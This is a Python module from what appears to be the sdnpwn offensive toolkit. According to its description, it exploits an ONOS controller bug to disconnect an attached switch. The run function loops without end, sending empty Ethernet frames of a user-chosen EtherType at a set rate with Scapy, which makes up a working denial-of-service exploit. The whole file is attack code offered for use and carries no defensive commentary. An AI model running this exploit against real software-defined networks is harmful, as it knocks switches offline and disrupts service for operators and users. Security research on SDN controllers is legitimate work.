import signal

import modules.sdnpwn.sdnpwn_common as sdnpwn
from scapy.all import Ether, sendp, conf
from time import sleep

conf.verb = 0

def signal_handler(signal, frame):
  #Handle Ctrl+C here
  print("")
  sdnpwn.message("Stopping...", sdnpwn.NORMAL)
  exit(0)

def info():
  #Description of the what the module is and what it does. This function should return a string.
  return "Exploit ONOS bug to disconnect the attached switch for as long as the attack persists."

def usage():
  sdnpwn.addUsage(["-i", "--iface"], "Interface to use.", True)
  sdnpwn.addUsage(["-e", "--ethertype"], "EtherType to use.", True)
  sdnpwn.addUsage(["-r", "--rate"], "Rate/Frequency to send packets in seconds. Modulating this can have different results.", True)

  return sdnpwn.getUsage()

def run(params):
  signal.signal(signal.SIGINT, signal_handler)

  if(sdnpwn.checkArg(["--iface", "-i"], params) == False):
    sdnpwn.message("Interface required", sdnpwn.ERROR)
    return
  if(sdnpwn.checkArg(["--ethertype", "-e"], params) == False):
    sdnpwn.message("Ethertype required", sdnpwn.ERROR)
    return
  if(sdnpwn.checkArg(["--rate", "-r"], params) == False):
    sdnpwn.message("Rate required", sdnpwn.ERROR)
    return

  iface = sdnpwn.getArg(["--iface", "-i"], params)
  ethertype = sdnpwn.getArg(["--ethertype", "-e"], params)
  rate = sdnpwn.getArg(["--rate", "-r"], params)

  try:
    ethertype = int(ethertype, 16)
  except:
    sdnpwn.message("Error converting given ethertype to hex!", sdnpwn.ERROR)

  try:
    rate = float(rate)
  except:
    sdnpwn.message("Error casting rate to float!", sdnpwn.ERROR)

  sdnpwn.message(f"Sending Ethernet frames from {iface}", sdnpwn.NORMAL)
  sdnpwn.message("Starting attack...", sdnpwn.NORMAL)

  while(1):
    # Send frame with no payload to trigger bug
    sendp(Ether(type=ethertype), iface=iface)
    sleep(rate)
